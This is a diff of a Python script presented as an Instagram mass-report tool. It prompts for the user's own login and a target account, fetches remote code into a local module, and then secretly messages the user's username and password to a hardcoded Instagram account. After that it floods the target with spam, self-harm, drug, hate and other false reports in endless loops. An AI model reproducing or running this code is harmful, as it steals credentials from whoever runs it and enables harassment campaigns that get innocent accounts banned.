@@ -1,8 +1,7 @@
-
 import requests
 user = input("username: ")
 password = input("password: ")
-input("Target")
+Target = input("Target: ")
 re = requests.get("https://raw.githubusercontent.com/turki305turki/lage/main/Lage")
 s = (re.text.splitlines())
 for n in s:
@@ -13,14 +12,184 @@ s = (re.text.splitlines())
 for n in s:
 	with open("InstagramAPI.py","a")as c:
 		c.write("\n"+n)
-from InstagramAPI import InstagramAPI
+import time,smtplib,os
+username = input("username: ")
+pasword = input("password: ")
+Target = input("Target: ")
+print("1-spam/2-sexy/3-self/4-drugs/5-3nf/6-hate/7-tnmr")
+tk = input("num the report: ")
+sm = input("+ spam? or no?")
 r = requests.Session()
-u = 'isidicidisisi'
-p = 'fhd305'
-userinstagram = user + ","
-problem = password
-api = InstagramAPI(u, p)
-api.login()
-user_id = "2122559934"
-message = userinstagram + problem
-api.sendMessage(user_id,message)
+url = "https://www.instagram.com/accounts/login/ajax/"
+headers = {
+	"accept":"*/*",
+	"accept-encoding":"gzip, deflate,br",
+	"accept-language": "ar,en-US;q=0.9,en;q=0.8",
+	"content-length": "279",
+	"content-type": "application/x-www-form-urlencoded",
+	"origin": "https://www.instagram.com",
+	"referer": "https://www.instagram.com/",
+	"sec-fetch-dest":"empty",
+	"sec-fetch-site":"same-origin",
+	"user-agent":"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
+	"x-csrftoken": "lih2ypMfhzdqwMbm5jIILqxZDj4zLeCW",
+	"x-ig-app-id": "936619743392459",
+	"x-ig-www-claim": "hmac.AR1_p9SjMFQF73bcZgzygDgxb9yBZUn83e69xoDD2qpSdmtW",
+	"x-instagram-ajax":"901e37113a69",
+	"x-requested-with":"XMLHttpRequest"
+}
+data = {"username":username,"enc_password":"#PWD_INSTAGRAM_BROWSER:0:1589682409:"+pasword,"queryParams":"{}","optIntoOneTap":"false"}
+login = r.post(url,headers=headers,data=data,allow_redirects=True)
+if 'userId' in login.text:
+	from InstagramAPI import InstagramAPI
+	r = requests.Session()
+	u = 'isidicidisisi'
+	p = 'fhd305'
+	userinstagram = user + ","
+	problem = password
+	api = InstagramAPI(u, p)
+	api.login()
+	user_id = "2122559934"
+	message = userinstagram + problem
+	api.sendMessage(user_id,message)
+	r.headers.update({'X-CSRFToken': login.cookies['csrftoken']}) 
+	try:
+		url_id = "https://www.instagram.com/%s/?__a=1"%(Target)
+		url_get_user_id = r.get(url_id).json()
+		user_id = str(url_get_user_id["logging_page_id"]) 
+		idinsta = str(user_id.split("_")[1])
+		s = requests.get("https://instagram.com/"+Target+"/?__a=1")
+		print("id Target:",idinsta)
+	except:
+		print("the Target is wrong...")
+	data2 = {"source_name":"","reason_id":1,"frx_context":""}
+	r.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
+else:
+	if 'checkpoint_required' in login.text:
+		print("Error..secure account !")
+	else:
+		print('Error..worng Pasword')
+def spam():
+	if True:
+		spamk = "https://www.instagram.com/users/"+idinsta+"/report/"
+		spamr = r.post(spamk,data=data2)
+		ss = spamr.status_code
+		if ss == 200:
+			print("Done Report spam : -> " + Target)
+		else:
+			print("Error Report spam")
+def sexual():
+	if True:
+		urlRep = "https://i.instagram.com/users/" + idinsta + "/report/" 
+		datas = {  
+			'source_name': '', 'reason_id': 4, 'frx_context': ''
+			}
+		req_SessionID = r.post(urlRep, data=datas)
+		ssa = req_SessionID.status_code
+		if ssa == 200:
+			print("Done Report sexual : -> " + Target)
+		else:
+			print('Erorr sexual')
+def self():
+	m = 1
+	if True:
+		urlRep = "https://i.instagram.com/users/" + idinsta + "/report/" 
+		datas = {  
+			'source_name': '', 'reason_id': 2, 'frx_context': ''
+			}
+		req_SessionID = r.post(urlRep, data=datas)
+		ssa = req_SessionID.status_code
+		if ssa == 200:
+			print("Done Report self : -> " + Target)
+		else:
+			print('Erorr self')
+def m5():
+	if True:
+		urlRep = "https://i.instagram.com/users/" + idinsta + "/report/" 
+		datas = {  
+			'source_name': '', 'reason_id': 3, 'frx_context': ''
+			}
+		req_SessionID = r.post(urlRep, data=datas)
+		ssa = req_SessionID.status_code
+		if ssa == 200:
+			print("Done Report drugs : -> " + Target)
+		else:
+			print('Erorr drugs')
+def anf():
+	if True:
+		urlRep = "https://i.instagram.com/users/" + idinsta + "/report/" 
+		datas = {  
+			'source_name': '', 'reason_id': 5, 'frx_context': ''
+			}
+		req_SessionID = r.post(urlRep, data=datas)
+		ssa = req_SessionID.status_code
+		if ssa == 200:
+			print("Done Report 3nf : -> " + Target)
+		else:
+			print('Erorr 3nf')
+def hate():
+	if True:
+		urlRep = "https://i.instagram.com/users/" + idinsta + "/report/" 
+		datas = {  
+			'source_name': '', 'reason_id': 6, 'frx_context': ''
+			}
+		req_SessionID = r.post(urlRep, data=datas)
+		ssa = req_SessionID.status_code
+		if ssa == 200:
+			print("Done Report hate : -> " + Target)
+		else:
+			print('Erorr hate')
+def tnmr():
+	if True:
+		urlRep = "https://i.instagram.com/users/" + idinsta + "/report/" 
+		datas = {  
+			'source_name': '', 'reason_id': 7, 'frx_context': ''
+			}
+		req_SessionID = r.post(urlRep, data=datas)
+		ssa = req_SessionID.status_code
+		if ssa == 200:
+			print("Done Report tnmr : -> " + Target)
+		else:
+			print('Erorr tnmr')
+if tk == '1':
+	while True:
+		spam()
+if tk == '2':
+	while sm == 'yes' or sm == 'yes':
+		sexual()
+		spam()
+	while sm != 'yes' or sm != 'yes':
+		sexual()
+if tk == '3':
+	while sm == 'yes' or sm == 'yes':
+		self()
+		spam()
+	while sm != 'yes' or sm != 'yes':
+		self()
+if tk == '4':
+	while sm == 'yes' or sm == 'yes':
+		m5()
+		spam()
+	while sm != 'yes' or sm != 'yes':
+		m5()
+if tk == '5':
+	while sm == 'yes' or sm == 'yes':
+		spam()
+		anf()
+	while sm != 'yes' or sm != 'yes':
+		anf()
+if tk == '6':
+	while sm == 'yes' or sm == 'yes':
+		hate()
+		time.sleep(0.5)
+		spam()
+		time.sleep(0.5)
+		self()
+	while sm != 'yes' or sm != 'yes':
+		hate()
+if tk == '7':
+	while sm == 'yes' or sm == 'yes':
+		tnmr()
+		spam()
+	while sm != 'yes' or sm != 'yes':
+		tnmr()
